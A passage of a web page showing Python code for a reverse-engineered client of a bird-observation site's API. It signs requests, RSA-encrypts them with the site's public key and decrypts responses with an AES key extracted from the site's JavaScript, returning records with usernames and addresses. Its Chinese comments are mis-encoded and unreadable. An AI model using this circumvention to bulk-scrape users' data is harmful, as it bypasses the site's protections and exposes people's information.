print(f&quot;æ€»æ•°æ®é‡: &#123;result[&#x27;count&#x27;]&#125;&quot;)</span></span><br><span class="line"><span class="string">    for activity in result[&#x27;data&#x27;]:</span></span><br><span class="line"><span class="string">        print(f&quot;&#123;activity[&#x27;username&#x27;]&#125;: &#123;activity[&#x27;pointName&#x27;]&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5, AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BirdReportAPI</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    BirdReport API å®¢æˆ·ç«¯</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    æä¾›å®Œæ•´çš„è¯·æ±‚åŠ å¯†ã€ç­¾åç”Ÿæˆå’Œå“åº”è§£å¯†åŠŸèƒ½</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, debug=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        åˆå§‹åŒ– API å®¢æˆ·ç«¯</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        å‚æ•°:</span></span><br><span class="line"><span class="string">            debug (bool): æ˜¯å¦å¼€å¯è°ƒè¯•æ¨¡å¼ï¼Œæ˜¾ç¤ºè¯¦ç»†çš„åŠ å¯†è§£å¯†ä¿¡æ¯</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.debug = debug</span><br><span class="line">        <span class="variable language_">self</span>.api_url = <span class="string">&quot;https://api.birdreport.cn/front/activity/search&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># RSA å…¬é’¥ (ç”¨äºè¯·æ±‚æ•°æ®åŠ å¯†)</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># Base64 ç¼–ç çš„å…¬é’¥ï¼Œ1024ä½</span></span><br><span class="line">        <span class="comment"># æ¥æº: JavaScript ä»£ç ä¸­çš„ paramPublicKey å˜é‡</span></span><br><span class="line">        <span class="variable language_">self</span>.public_key_base64 = <span class="string">&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCvxXa98E1uWXnBzXkS2yHUfnBM6n3PCwLdfIox03T91joBvjtoDqiQ5x3tTOfpHs3LtiqMMEafls6b0YWtgB1dse1W5m+FpeusVkCOkQxB4SZDH6tuerIknnmB/Hsq5wgEkIvO5Pff9biig6AyoAkdWpSek/1/B7zYIepYY0lxKQIDAQAB&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># AES å¯†é’¥å’Œ IV (ç”¨äºå“åº”æ•°æ®è§£å¯†)</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># è¿™äº›æ˜¯ç»è¿‡ getMapping() å‡½æ•°è½¬æ¢åçš„æœ€ç»ˆå€¼</span></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        <span class="comment"># JavaScript åŸå§‹æµç¨‹:</span></span><br><span class="line">        <span class="comment"># 1. åŸå§‹å­˜å‚¨: key_hex = &quot;6756696653534952657053656868665752665050485566485667545454484967&quot;</span></span><br><span class="line">        <span class="comment"># 2. è§£ç : &quot;gVifSSIRepSehhfWRfPPHUfHVgTTTHIg&quot;</span></span><br><span class="line">        <span class="comment"># 3. getMapping è½¬æ¢: &quot;C8EB5514AF5ADDB94B2207B08C66601C&quot; â† æˆ‘ä»¬ç›´æ¥ä½¿ç”¨è¿™ä¸ª</span></span><br><span class="line">        <span class="comment"># 4. CryptoJS.enc.Utf8.parse() è§£æä¸º WordArray</span></span><br><span class="line">        <span class="comment"># 5. AES è§£å¯†</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Python å®ç°: æˆ‘ä»¬è·³è¿‡æ­¥éª¤1-2ï¼Œç›´æ¥ä½¿ç”¨æ­¥éª¤3çš„ç»“æœ</span></span><br><span class="line">        <span class="variable language_">self</span>.aes_key_str = <span class="string">&quot;C8EB5514AF5ADDB94B2207B08C66601C&quot;</span>  <span class="comment"># 32å­—ç¬¦ = 32å­—èŠ‚ (AES-256)</span></span><br><span class="line">        <span class="variable language_">self</span>.aes_iv_str = <span class="string">&quot;55DD79C6F04E1A67&quot;</span>                    <span class="comment"># 16å­—ç¬¦ = 16å­—èŠ‚</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è½¬æ¢ä¸ºå­—èŠ‚</span></span><br><span class="line">        <span class="variable language_">self</span>.aes_key = <span class="variable language_">self</span>.aes_key_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 32å­—èŠ‚</span></span><br><span class="line">        <span class="variable language_">self</span>.aes_iv = <span class="variable language_">self</span>.aes_iv_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># 16å­—èŠ‚</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;BirdReportAPI åˆå§‹åŒ–&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;AES Key: <span class="subst">&#123;self.aes_key_str&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(self.aes_key)&#125;</span> bytes)&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;AES IV:  <span class="subst">&#123;self.aes_iv_str&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(self.aes_iv)&#125;</span> bytes)&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># HTTP è¯·æ±‚å¤´</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="variable language_">self</span>.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/javascript, */*; q=0.01&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://www.birdreport.cn&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.birdreport.cn/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_uuid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        ç”Ÿæˆ UUID v4</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        å¯¹åº” JavaScript å‡½æ•°: getUuid()</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        ç”Ÿæˆè§„åˆ™:</span></span><br><span class="line"><span class="string">        1. ç”Ÿæˆ32ä½éšæœºåå…­è¿›åˆ¶å­—ç¬¦</span></span><br><span class="line"><span class="string">        2. ç¬¬15ä½(ç´¢å¼•14)è®¾ç½®ä¸º&#x27;4&#x27; (UUIDç‰ˆæœ¬4)</span></span><br><span class="line"><span class="string">        3. ç¬¬20ä½(ç´¢å¼•19)è®¾ç½®ä¸º8-bä¹‹é—´ (å˜ä½“ä½)</span></span><br><span class="line"><span class="string">        4. ç‰¹æ®Šå¤„ç†: s[8] = s[13] = s[18] = s[23] (åŸJSä»£ç ä¸­çš„æ¨¡å¼)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        è¿”å›:</span></span><br><span class="line"><span class="string">            str: 32ä½UUIDå­—ç¬¦ä¸² (æ— è¿å­—ç¬¦)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        ç¤ºä¾‹:</span></span><br><span class="line"><span class="string">            &#x27;a2e45d1c3cd24e72b50524aae5d72326&#x27;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hex_digits = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">        s = [random.choice(hex_digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># UUID v4 æ ‡å‡†</span></span><br><span class="line">        s[<span class="number">14</span>] = <span class="string">&quot;4&quot;</span>  <span class="comment"># ç‰ˆæœ¬å·</span></span><br><span class="line">        s[<span class="number">19</span>] = hex_digits[(<span class="built_in">int</span>(s[<span class="number">19</span>], <span class="number">16</span>) &amp; <span class="number">3</span>) | <span class="number">8</span>]  <span class="comment"># å˜ä½“ä½</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åŸJSä»£ç çš„ç‰¹æ®Šå¤„ç†</span></span><br><span class="line">        s[<span class="number">8</span>] = s[<span class="number">13</span>] = s[<span class="number">18</span>] = s[<span class="number">23</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">self, text</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        è®¡ç®— MD5 å“ˆå¸Œ</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        å‚æ•°:</span></span><br><span class="line"><span class="string">            text (str): è¦å“ˆå¸Œçš„æ–‡æœ¬</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        è¿”å›:</span></span><br><span class="line"><span class="string">            str: 32ä½å°å†™åå…­è¿›åˆ¶MD5å“ˆå¸Œå€¼</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        ç¤ºä¾‹:</span></span><br><span class="line"><span class="string">            md5_hash(&quot;hello&quot;) â†’ &quot;5d41402abc4b2a76b9719d911017c592&quot;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_long</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        RSA åˆ†æ®µåŠ å¯†é•¿æ–‡æœ¬</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        å¯¹åº” JavaScript å‡½æ•°: encrypt.encryptLong(data)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        æŠ€æœ¯ç»†èŠ‚:</span></span><br><span class="line"><span class="string">        1. ç®—æ³•: RSA PKCS#1 v1.5</span></span><br><span class="line"><span class="string">        2. å¯†é’¥: 1024ä½å…¬é’¥</span></span><br><span class="line"><span class="string">        3. åˆ†å—: æ¯å—æœ€å¤š117å­—èŠ‚ (1024/8 - 11 = 117)</span></span><br><span class="line"><span class="string">        4. åŸå› : PKCS#1 v1.5 å¡«å……éœ€è¦11å­—èŠ‚å¼€é”€</span></span><br><span class="line"><span class="string">        5. å¤„ç†: å°†æ•°æ®åˆ†å—åŠ å¯†ï¼Œç„¶ååˆå¹¶</span></span><br><span class="line"><span class="string">        6. ç¼–ç : Base64</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        å‚æ•°:</span></span><br><span class="line"><span class="string">            data (str): è¦åŠ å¯†çš„JSONå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        è¿”å›:</span></span><br><span class="line"><span class="string">            str: Base64ç¼–ç çš„åŠ å¯†æ•°æ®ï¼Œå¤±è´¥è¿”å›None</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        ç¤ºä¾‹:</span></span><br><span class="line"><span class="string">            data = &#x27;&#123;&quot;limit&quot;:&quot;20&quot;,&quot;page&quot;:&quot;1&quot;&#125;&#x27;</span></span><br><span class="line"><span class="string">            encrypted = encrypt_long(data)</span></span><br><span class="line"><span class="string">            # â†’ &quot;HJAQD7ZVObtbg7ATM5wsjNhaShrPKyyoqOnQq5eaj5+4...&quot;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># æ­¥éª¤1: æ„å»ºPEMæ ¼å¼çš„å…¬é’¥</span></span><br><span class="line">            pem_key = <span class="string">f&quot;-----BEGIN PUBLIC KEY-----\n<span class="subst">&#123;self.public_key_base64&#125;</span>\n-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤2: å¯¼å…¥RSAå…¬é’¥</span></span><br><span class="line">            rsa_key = RSA.import_key(pem_key)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤3: åˆ›å»ºPKCS#1 v1.5åŠ å¯†å™¨</span></span><br><span class="line">            cipher = PKCS1_v1_5.new(rsa_key)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤4: è®¡ç®—å—å¤§å°</span></span><br><span class="line">            <span class="comment"># RSAåŠ å¯†å—å¤§å° = (å¯†é’¥ä½æ•° / 8) - å¡«å……å¼€é”€</span></span><br><span class="line">            <span class="comment"># 1024ä½å¯†é’¥ = 128å­—èŠ‚ï¼ŒPKCS#1 v1.5å¡«å……éœ€è¦11å­—èŠ‚</span></span><br><span class="line">            <span class="comment"># å› æ­¤æ¯å—æœ€å¤š: 128 - 11 = 117å­—èŠ‚</span></span><br><span class="line">            block_size = <span class="number">117</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤5: å°†æ•°æ®è½¬ä¸ºå­—èŠ‚å¹¶åˆ†å—åŠ å¯†</span></span><br><span class="line">            data_bytes = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            encrypted_blocks = []</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ”’ RSAåŠ å¯†:&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   åŸå§‹æ•°æ®é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(data_bytes)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   åˆ†å—å¤§å°: <span class="subst">&#123;block_size&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   å—æ•°: <span class="subst">&#123;(<span class="built_in">len</span>(data_bytes) + block_size - <span class="number">1</span>) // block_size&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data_bytes), block_size):</span><br><span class="line">                block = data_bytes[i:i + block_size]</span><br><span class="line">                encrypted_block = cipher.encrypt(block)</span><br><span class="line">                encrypted_blocks.append(encrypted_block)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤6: åˆå¹¶æ‰€æœ‰åŠ å¯†å—</span></span><br><span class="line">            encrypted_data = <span class="string">b&#x27;&#x27;</span>.join(encrypted_blocks)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤7: Base64ç¼–ç </span></span><br><span class="line">            result = base64.b64encode(encrypted_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   åŠ å¯†åé•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_data)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   Base64é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(result)&#125;</span> å­—ç¬¦&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âŒ RSAåŠ å¯†å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="keyword">import</span> traceback</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_response</span>(<span class="params">self, encrypted_text</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        AES-256-CBC è§£å¯†å“åº”æ•°æ®</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        å¯¹åº” JavaScript ä»£ç :</span></span><br><span class="line"><span class="string">        ```javascript</span></span><br><span class="line"><span class="string">        CryptoJS.AES.decrypt(encrypted, key, &#123;</span></span><br><span class="line"><span class="string">            iv: iv,</span></span><br><span class="line"><span class="string">            mode: CryptoJS.mode.CBC,</span></span><br><span class="line"><span class="string">            padding: CryptoJS.pad.Pkcs7</span></span><br><span class="line"><span class="string">        &#125;).toString(CryptoJS.enc.Utf8);</span></span><br><span class="line"><span class="string">        ```</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        æŠ€æœ¯ç»†èŠ‚:</span></span><br><span class="line"><span class="string">        1. ç®—æ³•: AES-256-CBC</span></span><br><span class="line"><span class="string">        2. å¯†é’¥: 32å­—èŠ‚ (256ä½)</span></span><br><span class="line"><span class="string">        3. IV: 16å­—èŠ‚ (128ä½)</span></span><br><span class="line"><span class="string">        4. æ¨¡å¼: CBC (Cipher Block Chaining)</span></span><br><span class="line"><span class="string">        5. å¡«å……: PKCS7</span></span><br><span class="line"><span class="string">        6. ç¼–ç : Base64 â†’ è§£å¯† â†’ UTF-8</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        å¯†é’¥è½¬æ¢è¿‡ç¨‹ (JavaScript):</span></span><br><span class="line"><span class="string">        åŸå§‹å€¼ â†’ hexè§£ç  â†’ getMappingè½¬æ¢ â†’ UTF8è§£æ â†’ WordArray</span></span><br><span class="line"><span class="string">        Pythonå®ç°: ç›´æ¥ä½¿ç”¨æœ€ç»ˆçš„UTF-8å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        å‚æ•°:</span></span><br><span class="line"><span class="string">            encrypted_text (str): Base64ç¼–ç çš„åŠ å¯†æ•°æ®</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        è¿”å›:</span></span><br><span class="line"><span class="string">            str: è§£å¯†åçš„JSONå­—ç¬¦ä¸²ï¼Œå¤±è´¥è¿”å›None</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        ç¤ºä¾‹:</span></span><br><span class="line"><span class="string">            encrypted = &quot;/260Pg79+EXMZT3I1gCELbLBO6PMfVmN...&quot;</span></span><br><span class="line"><span class="string">            decrypted = decrypt_response(encrypted)</span></span><br><span class="line"><span class="string">            # â†’ &#x27;[&#123;&quot;address&quot;:&quot;ä¸Šæµ·å¸‚...&quot;,&quot;username&quot;:&quot;å¼ ä¸‰&quot;,...&#125;]&#x27;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ”“ AESè§£å¯†:&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   åŠ å¯†æ•°æ®é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_text)&#125;</span> å­—ç¬¦&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤1: Base64è§£ç </span></span><br><span class="line">            encrypted_data = base64.b64decode(encrypted_text)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   Base64è§£ç å: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_data)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤2: åˆ›å»ºAES-256-CBCè§£å¯†å™¨</span></span><br><span class="line">            <span class="comment"># - å¯†é’¥: 32å­—èŠ‚ UTF-8ç¼–ç çš„å­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="comment"># - IV: 16å­—èŠ‚ UTF-8ç¼–ç çš„å­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="comment"># - æ¨¡å¼: CBC (éœ€è¦IV)</span></span><br><span class="line">            cipher = AES.new(<span class="variable language_">self</span>.aes_key, AES.MODE_CBC, <span class="variable language_">self</span>.aes_iv)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤3: è§£å¯†æ•°æ®</span></span><br><span class="line">            decrypted_padded = cipher.decrypt(encrypted_data)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤4: å»é™¤PKCS7å¡«å……</span></span><br><span class="line">            <span class="comment"># PKCS7å¡«å……è§„åˆ™: å¦‚æœéœ€è¦å¡«å……nä¸ªå­—èŠ‚ï¼Œåˆ™æ¯ä¸ªå¡«å……å­—èŠ‚çš„å€¼éƒ½æ˜¯n</span></span><br><span class="line">            <span class="comment"># ä¾‹å¦‚: éœ€è¦å¡«å……5å­—èŠ‚ï¼Œåˆ™å¡«å…… 0x05 0x05 0x05 0x05 0x05</span></span><br><span class="line">            decrypted = unpad(decrypted_padded, AES.block_size)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ­¥éª¤5: è½¬æ¢ä¸ºUTF-8å­—ç¬¦ä¸²</span></span><br><span class="line">            result = decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   è§£å¯†åé•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(result)&#125;</span> å­—ç¬¦&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   æ•°æ®é¢„è§ˆ: <span class="subst">&#123;result[:<span class="number">100</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âŒ AESè§£å¯†å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="keyword">import</span> traceback</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, page=<span class="number">1</span>, limit=<span class="number">20</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        æœç´¢é¸Ÿç±»è§‚å¯Ÿæ´»åŠ¨</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        å®Œæ•´æµç¨‹:</span></span><br><span class="line"><span class="string">        1. ç”Ÿæˆæ—¶é—´æˆ³å’ŒUUID</span></span><br><span class="line"><span class="string">        2. æ„å»ºJSONæ•°æ®</span></span><br><span class="line"><span class="string">        3. è®¡ç®—MD5ç­¾å</span></span><br><span class="line"><span class="string">        4. RSAåŠ å¯†æ•°æ®</span></span><br><span class="line"><span class="string">        5. è®¾ç½®è¯·æ±‚å¤´(timestamp, requestId, sign)</span></span><br><span class="line"><span class="string">        6. å‘é€POSTè¯·æ±‚</span></span><br><span class="line"><span class="string">        7. æ¥æ”¶å“åº”</span></span><br><span class="line"><span class="string">        8. æ£€æµ‹å¹¶è§£å¯†åŠ å¯†å­—æ®µ</span></span><br><span class="line"><span class="string">        9. è¿”å›è§£å¯†åçš„JSONæ•°æ®</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        å‚æ•°:</span></span><br><span class="line"><span class="string">            page (int): é¡µç ï¼Œä»1å¼€å§‹</span></span><br><span class="line"><span class="string">            limit (int): æ¯é¡µæ•°é‡ï¼Œå»ºè®®20-50</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        è¿”å›:</span></span><br><span class="line"><span class="string">            dict: è§£å¯†åçš„å“åº”æ•°æ®ï¼Œæ ¼å¼å¦‚ä¸‹:</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;code&quot;: 0,              # 0è¡¨ç¤ºæˆåŠŸ</span></span><br><span class="line"><span class="string">                &quot;count&quot;: 1060129,       # æ€»æ•°æ®é‡</span></span><br><span class="line"><span class="string">                &quot;data&quot;: [               # æ´»åŠ¨åˆ—è¡¨</span></span><br><span class="line"><span class="string">                    &#123;</span></span><br><span class="line"><span class="string">                        &quot;serialId&quot;: &quot;2025102602261&quot;,</span></span><br><span class="line"><span class="string">                        &quot;username&quot;: &quot;kingwood&quot;,</span></span><br><span class="line"><span class="string">                        &quot;pointName&quot;: &quot;å¹¿å·å¸‚ç™½äº‘åŒºé¾™è™å²—&quot;,</span></span><br><span class="line"><span class="string">                        &quot;address&quot;: &quot;å¹¿ä¸œçœå¹¿å·å¸‚ç™½äº‘åŒº...&quot;,</span></span><br><span class="line"><span class="string">                        &quot;startTime&quot;: &quot;2025-10-26 09:00&quot;,</span></span><br><span class="line"><span class="string">                        &quot;endTime&quot;: &quot;2025-10-26 15:12&quot;,</span></span><br><span class="line"><span class="string">                        &quot;taxonCount&quot;: 15,</span></span><br><span class="line"><span class="string">                        ...</span></span><br><span class="line"><span class="string">                    &#125;,</span></span><br><span class="line"><span class="string">                    ...</span></span><br><span class="line"><span class="string">                ],</span></span><br><span class="line"><span class="string">                &quot;timestamp&quot;: 1761489027,</span></span><br><span class="line"><span class="string">                &quot;sign&quot;: &quot;...&quot;,</span></span><br><span class="line"><span class="string">                &quot;requestId&quot;: &quot;...&quot;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            å¤±è´¥è¿”å›None</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        ç¤ºä¾‹:</span></span><br><span class="line"><span class="string">            api = BirdReportAPI()</span></span><br><span class="line"><span class="string">            result = api.search(page=1, limit=20)</span></span><br><span class="line"><span class="string">            if result and result.get(&#x27;code&#x27;) == 0:</span></span><br><span class="line"><span class="string">                for activity in result[&#x27;data&#x27;]:</span></span><br><span class="line"><span class="string">                    print(activity[&#x27;username&#x27;], activity[&#x27;pointName&#x27;])</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;æœç´¢æ´»åŠ¨ (page=<span class="subst">&#123;page&#125;</span>, limit=<span class="subst">&#123;limit&#125;</span>)&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span 